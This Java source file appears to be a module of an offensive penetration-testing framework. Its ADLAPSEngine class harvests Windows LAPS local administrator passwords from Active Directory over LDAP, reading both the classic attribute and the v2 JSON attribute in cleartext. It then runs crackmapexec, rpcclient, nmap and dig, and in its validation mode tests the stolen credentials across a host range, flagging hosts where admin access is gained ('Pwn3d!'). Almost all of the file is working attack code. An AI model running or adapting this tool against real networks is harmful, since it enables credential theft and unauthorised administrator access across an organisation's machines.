package com.jabber.jabber.modules.reconnaissance.adlaps;

import com.jabber.jabber.data.model.ModuleResult;
import com.jabber.jabber.data.model.TaskContext;

import java.time.Instant;
import java.time.ZoneOffset;
import java.time.format.DateTimeFormatter;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.naming.Context;
import javax.naming.NamingEnumeration;
import javax.naming.directory.Attribute;
import javax.naming.directory.Attributes;
import javax.naming.directory.SearchControls;
import javax.naming.directory.SearchResult;
import javax.naming.ldap.InitialLdapContext;
import javax.naming.ldap.LdapContext;

/**
 * ADLAPSEngine — Hybrid 8-Step Execution Doctrine Implementation.
 */
public class ADLAPSEngine {

    private static final String MODULE_ID = "recon-ad-laps";
    private final ToolManager toolManager;

    private static final long AD_EPOCH_DIFF_SECONDS = 11_644_473_600L;
    private static final DateTimeFormatter ISO_FMT = DateTimeFormatter.ISO_OFFSET_DATE_TIME;
    private static final Pattern LAPS_V2_PASSWORD_PATTERN = Pattern.compile("\\\"p\\\"\\s*:\\s*\\\"([^\\\"]*)\\\"");
    private static final Pattern LAPS_V2_ACCOUNT_PATTERN = Pattern.compile("\\\"n\\\"\\s*:\\s*\\\"([^\\\"]*)\\\"");

    public ADLAPSEngine(ToolManager toolManager) {
        this.toolManager = toolManager;
    }

    public ModuleResult execute(Map<String, String> input, TaskContext ctx) {
        ModuleResult result = new ModuleResult(ctx.getTaskId(), MODULE_ID);
        long startedAt = System.currentTimeMillis();
        List<CommandRecord> allRecords = new ArrayList<>();
        List<Map<String, Object>> allFindings = new ArrayList<>();
        String modeRaw = input.getOrDefault("mode", "EXTRACT").toUpperCase().trim();
        String dc = input.getOrDefault("dc", "").trim();
        String targetRange = input.getOrDefault("target_range", "").trim();
        List<String> selectedTools = input.containsKey("selectedTools")
            ? (input.get("selectedTools").isBlank() ? new ArrayList<>() : Arrays.asList(input.get("selectedTools").split(",")))
            : new ArrayList<>();

        if (selectedTools.isEmpty() || (selectedTools.size() == 1 && selectedTools.get(0).isBlank())) {
            result.fail("[Must select a tool for execution]");
            return result;
        }

        if (dc.isEmpty() && targetRange.isEmpty()) {
            result.fail("[Input required for execution]");
            return result;
        }

        try {
            // ── Step 1: Validate Mode ──
            ctx.log("[*] Step 1/8 — Validating execution mode...");
            if (!"EXTRACT".equals(modeRaw) && !"VAL".equals(modeRaw)) {
                result.fail("Unsupported mode: " + modeRaw + ". Valid modes: EXTRACT, VAL.");
                return result;
            }
            ctx.log("[+] Mode validated: " + modeRaw);
            ctx.reportProgress(5);

            // ── Step 2: Sanitize Schema ──
            ctx.log("[*] Step 2/8 — Sanitizing inputs...");
            String dcSanitized = InputSanitizer.validateTarget(dc);
            String domain = InputSanitizer.validateDomain(input.getOrDefault("domain", ""));
            String baseDn = InputSanitizer.validateBaseDn(input.getOrDefault("base_dn", ""));
            String user = InputSanitizer.validateUsername(input.getOrDefault("user", ""));
            String pass = InputSanitizer.validatePassword(input.getOrDefault("pass", ""));
            String targetRangeSanitized = InputSanitizer.validateTarget(targetRange);

            ctx.log("[+] DC: " + dcSanitized + " | Domain: " + domain);
            ctx.reportProgress(10);

            // ── Step 3: Target Intelligence ──
            ctx.log("[*] Step 3/8 — Target intelligence...");
            Map<String, Object> intelligence = new LinkedHashMap<>();
            intelligence.put("dc", dcSanitized);
            intelligence.put("domain", domain);
            ctx.reportProgress(20);

            // ── Step 4: Tool Readiness ──
            ctx.log("[*] Step 4/8 — Verifying tool readiness...");
            Map<String, String> toolPaths = new LinkedHashMap<>();
            for (ToolManager.ToolDefinition def : toolManager.getRequiredTools()) {
                ToolManager.ToolStatus status = toolManager.getToolStatus(def.id);
                if (status.isInstalled()) toolPaths.put(def.id, status.getPath());
                else ctx.log("[~] Tool missing: " + def.id);
            }
            ctx.reportProgress(30);

            // ── Step 5 & 6: Dynamic Command Pipeline Orchestration ──
            ctx.log("[*] Step 5/8 — Executing pipeline for mode " + modeRaw + "...");
            if ("EXTRACT".equals(modeRaw)) {
                executeEXTRACTPipeline(dcSanitized, domain, baseDn, user, pass, toolPaths, selectedTools, ctx, allRecords, allFindings);
            } else if ("VAL".equals(modeRaw)) {
                executeVALPipeline(dcSanitized, domain, targetRangeSanitized, user, pass, toolPaths, selectedTools, ctx, allRecords, allFindings);
            }
            ctx.reportProgress(85);

            // ── Step 7: Findings Extraction ──
            ctx.log("[*] Step 7/8 — Aggregating findings...");
            for (Map<String, Object> finding : allFindings) {
                result.addFinding(finding);
            }

            // ── Step 8: Full Telemetry ──
            ctx.log("[*] Step 8/8 — Recording telemetry...");
            ReportGenerator reportGenerator = new ReportGenerator();
            ReportGenerator.ReportPayload payload = reportGenerator.buildReport(
                modeRaw, dcSanitized, allRecords, allFindings, intelligence, startedAt
            );
            result.setNormalizedOutput(payload.normalizedOutput);
            result.complete(payload.output);

            ctx.log("[+] ADLAPS completed: " + allFindings.size() + " findings extracted.");
            ctx.reportProgress(100);

        } catch (java.util.concurrent.CancellationException e) {
            ctx.log("[!] Execution cancelled by user.");
            throw e;
        } catch (Exception e) {
            result.fail("Execution failed: " + e.getMessage());
            ctx.log("[!] FATAL: " + e.getMessage());
        }

        return result;
    }

    // ═══════════════════════════════════════════════════════════════════
    //  EXTRACT Pipeline (Hybrid)
    // ═══════════════════════════════════════════════════════════════════

    private void executeEXTRACTPipeline(
            String dc, String domain, String baseDn, String user, String pass,
            Map<String, String> toolPaths, List<String> selectedTools,
            TaskContext ctx, List<CommandRecord> records,
            List<Map<String, Object>> findings) {

        // 1. JNDI LAPS Extract
        if (shouldRun("jndi", selectedTools)) {
            ctx.log("[*] Executing native JNDI LAPS Extraction...");
        List<Map<String, Object>> creds = new ArrayList<>();
        try {
            LdapContext ldap = getLdapContext(dc, user, pass);
            String searchBase = baseDn.isBlank() ? resolveBaseDn(ldap) : baseDn;
            SearchControls sc = new SearchControls();
            sc.setSearchScope(SearchControls.SUBTREE_SCOPE);
            sc.setReturningAttributes(new String[]{"dNSHostName", "sAMAccountName", "ms-Mcs-AdmPwd", "ms-Mcs-AdmPwdExpirationTime", "msLAPS-Password", "msLAPS-PasswordExpirationTime"});
            
            // Search for objects with either Classic or V2 passwords
            NamingEnumeration<SearchResult> results = ldap.search(searchBase, "(|(ms-Mcs-AdmPwd=*)(msLAPS-Password=*))", sc);
            while (results.hasMore()) {
                SearchResult sr = results.next();
                Attributes attrs = sr.getAttributes();
                
                String host = firstNonBlank(getString(attrs, "dNSHostName"), getString(attrs, "sAMAccountName"));
                String classicPass = getString(attrs, "ms-Mcs-AdmPwd");
                String v2PassRaw = getString(attrs, "msLAPS-Password");
                
                String plaintext = "";
                String account = "Administrator";
                long expiryRaw = 0;
                
                if (!v2PassRaw.isBlank()) {
                    Matcher pm = LAPS_V2_PASSWORD_PATTERN.matcher(v2PassRaw);
                    if (pm.find()) plaintext = pm.group(1);
                    else if (!v2PassRaw.trim().startsWith("{")) plaintext = v2PassRaw.trim();
                    
                    Matcher am = LAPS_V2_ACCOUNT_PATTERN.matcher(v2PassRaw);
                    if (am.find()) account = am.group(1);
                    
                    expiryRaw = parseLong(getString(attrs, "msLAPS-PasswordExpirationTime"));
                } else if (!classicPass.isBlank()) {
                    plaintext = classicPass;
                    expiryRaw = parseLong(getString(attrs, "ms-Mcs-AdmPwdExpirationTime"));
                }
                
                if (!plaintext.isBlank()) {
                    Map<String, Object> cred = new LinkedHashMap<>();
                    cred.put("hostname", host);
                    cred.put("admin_account", account);
                    cred.put("password", plaintext);
                    cred.put("expiration", fileTimeToIso(expiryRaw));
                    creds.add(cred);
                }
            }
            ldap.close();
            ctx.log("[+] JNDI Extraction found " + creds.size() + " cleartext passwords.");
        } catch (Exception e) {
            ctx.log("[!] JNDI Extraction failed: " + e.getMessage());
        }

        if (!creds.isEmpty()) {
            for (Map<String, Object> cred : creds) {
                Map<String, Object> f = new LinkedHashMap<>();
                f.put("type", "laps_credentials");
                f.putAll(cred);
                findings.add(f);
            }
        }
        }

        // 2. rpcclient Mapping
        if (shouldRun("rpcclient", selectedTools) && toolPaths.containsKey("rpcclient")) {
            ctx.log("[*] Executing rpcclient querydispinfo...");
            CommandRecord rec = ProcessExecutor.execute("rpcclient", toolPaths.get("rpcclient"),
                List.of("-U", user + "%" + pass, "-c", "querydispinfo", dc), 30_000L, ctx, line -> {}, null);
            records.add(rec);
        }

        // 3. crackmapexec LAPS Check
        if (shouldRun("crackmapexec", selectedTools) && toolPaths.containsKey("crackmapexec")) {
            ctx.log("[*] Executing crackmapexec --laps...");
            CommandRecord rec = ProcessExecutor.execute("crackmapexec", toolPaths.get("crackmapexec"),
                List.of("smb", dc, "-u", user, "-p", pass, "--laps"), 90_000L, ctx, line -> {}, null);
            records.add(rec);
            if (rec.exitCode == 0 && !rec.stdout.isBlank()) {
                findings.addAll(parseCmeSmbOutput(rec.stdout));
            }
        }

        // 4. nmap Target Discovery
        if (shouldRun("nmap", selectedTools) && toolPaths.containsKey("nmap")) {
            ctx.log("[*] Executing nmap OS discovery...");
            CommandRecord rec = ProcessExecutor.execute("nmap", toolPaths.get("nmap"),
                List.of("-p", "445", "--script", "smb-os-discovery", dc), 120_000L, ctx, line -> {}, null);
            records.add(rec);
        }

        // 5. dig Host Mapping
        if (shouldRun("dig", selectedTools) && toolPaths.containsKey("dig")) {
            ctx.log("[*] Executing dig A query...");
            CommandRecord rec = ProcessExecutor.execute("dig", toolPaths.get("dig"),
                List.of("-t", "A", dc), 15_000L, ctx, line -> {}, null);
            records.add(rec);
        }
    }

    // ═══════════════════════════════════════════════════════════════════
    //  VAL Pipeline
    // ═══════════════════════════════════════════════════════════════════

    private void executeVALPipeline(
            String dc, String domain, String targetRange, String user, String pass,
            Map<String, String> toolPaths, List<String> selectedTools,
            TaskContext ctx, List<CommandRecord> records,
            List<Map<String, Object>> findings) {

        // 1. crackmapexec Range Validation
        if (shouldRun("crackmapexec", selectedTools) && toolPaths.containsKey("crackmapexec")) {
            ctx.log("[*] Executing crackmapexec SMB validation on target range...");
            CommandRecord rec = ProcessExecutor.execute("crackmapexec", toolPaths.get("crackmapexec"),
                List.of("smb", targetRange, "-u", user, "-p", pass), 90_000L, ctx, line -> {}, null);
            records.add(rec);
            if (rec.exitCode == 0 && !rec.stdout.isBlank()) {
                findings.addAll(parseCmeSmbOutput(rec.stdout));
            }
        }

        // 2. nmap Liveness Check
        if (shouldRun("nmap", selectedTools) && toolPaths.containsKey("nmap")) {
            ctx.log("[*] Executing nmap ping sweep...");
            CommandRecord rec = ProcessExecutor.execute("nmap", toolPaths.get("nmap"),
                List.of("-sn", targetRange), 120_000L, ctx, line -> {}, null);
            records.add(rec);
        }

        // 3. rpcclient Cred Check
        if (shouldRun("rpcclient", selectedTools) && toolPaths.containsKey("rpcclient")) {
            ctx.log("[*] Executing rpcclient getusername...");
            CommandRecord rec = ProcessExecutor.execute("rpcclient", toolPaths.get("rpcclient"),
                List.of("-U", user + "%" + pass, "-c", "getusername", dc), 30_000L, ctx, line -> {}, null);
            records.add(rec);
        }

        // 4. JNDI LDAP RootDSE
        if (shouldRun("jndi", selectedTools)) {
            ctx.log("[*] Executing JNDI RootDSE Check...");
        try {
            LdapContext ldap = getLdapContext(dc, user, pass);
            resolveBaseDn(ldap);
            ldap.close();
            ctx.log("[+] JNDI RootDSE Check successful.");
        } catch (Exception e) {
            ctx.log("[!] JNDI RootDSE Check failed: " + e.getMessage());
        }
        }

        // 5. dig PTR
        if (shouldRun("dig", selectedTools) && toolPaths.containsKey("dig")) {
            ctx.log("[*] Executing dig PTR query...");
            CommandRecord rec = ProcessExecutor.execute("dig", toolPaths.get("dig"),
                List.of("-x", dc), 15_000L, ctx, line -> {}, null);
            records.add(rec);
        }
    }

    // ═══════════════════════════════════════════════════════════════════
    //  HELPERS & PARSERS
    // ═══════════════════════════════════════════════════════════════════

    private LdapContext getLdapContext(String dc, String user, String pass) throws Exception {
        Hashtable<String, String> env = new Hashtable<>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
        env.put(Context.PROVIDER_URL, "ldap://" + dc);
        env.put(Context.REFERRAL, "ignore");
        if (!user.isBlank()) {
            env.put(Context.SECURITY_AUTHENTICATION, "simple");
            env.put(Context.SECURITY_PRINCIPAL, user.contains("@") || user.contains("\\") ? user : user + "@" + dc);
            env.put(Context.SECURITY_CREDENTIALS, pass);
        } else {
            env.put(Context.SECURITY_AUTHENTICATION, "none");
        }
        return new InitialLdapContext(env, null);
    }

    private String resolveBaseDn(LdapContext ldap) throws Exception {
        Attributes rootDse = ldap.getAttributes("", new String[] {"defaultNamingContext"});
        Attribute namingContext = rootDse.get("defaultNamingContext");
        if (namingContext != null && namingContext.size() > 0) {
            return String.valueOf(namingContext.get()).trim();
        }
        throw new Exception("Unable to resolve defaultNamingContext");
    }

    private String getString(Attributes attrs, String name) {
        try {
            Attribute attr = attrs.get(name);
            if (attr != null && attr.get() != null) return String.valueOf(attr.get()).trim();
        } catch (Exception ignored) {}
        return "";
    }

    private long parseLong(String val) {
        if (val.isBlank()) return 0;
        try { return Long.parseLong(val); } catch (Exception e) { return 0; }
    }

    private String firstNonBlank(String... vals) {
        for (String v : vals) if (!v.isBlank()) return v;
        return "";
    }

    private String fileTimeToIso(long fileTime) {
        if (fileTime <= 0) return "Unknown";
        long epochSeconds = (fileTime / 10_000_000L) - AD_EPOCH_DIFF_SECONDS;
        try {
            return Instant.ofEpochSecond(epochSeconds).atOffset(ZoneOffset.UTC).format(ISO_FMT);
        } catch (Exception e) { return "Unknown"; }
    }

    private List<Map<String, Object>> parseCmeSmbOutput(String stdout) {
        List<Map<String, Object>> findings = new ArrayList<>();
        String[] lines = stdout.split("\\r?\\n");
        for (String line : lines) {
            if (line.contains("SMB") && line.contains("445")) {
                Map<String, Object> h = new LinkedHashMap<>();
                h.put("type", "smb_validation");
                Matcher m = Pattern.compile("SMB\\s+([a-zA-Z0-9.-]+)\\s+445").matcher(line);
                if (m.find()) h.put("target", m.group(1));
                else h.put("target", "Unknown");
                
                if (line.contains("(Pwn3d!)")) {
                    h.put("status", "Pwn3d!");
                    h.put("details", "Admin privileges acquired");
                } else if (line.contains("[+]")) {
                    h.put("status", "VALID");
                    h.put("details", "Login successful");
                } else if (line.contains("[-]")) {
                    h.put("status", "FAILED");
                    h.put("details", "Login failed");
                } else {
                    h.put("status", "INFO");
                    h.put("details", "Fingerprinted");
                }
                findings.add(h);
            }
        }
        return findings;
    }

    private boolean shouldRun(String toolId, List<String> selectedTools) {
        if (selectedTools.isEmpty()) return false;
        if (selectedTools.size() == 1 && selectedTools.get(0).isEmpty()) return false;
        return selectedTools.contains(toolId);
    }
}
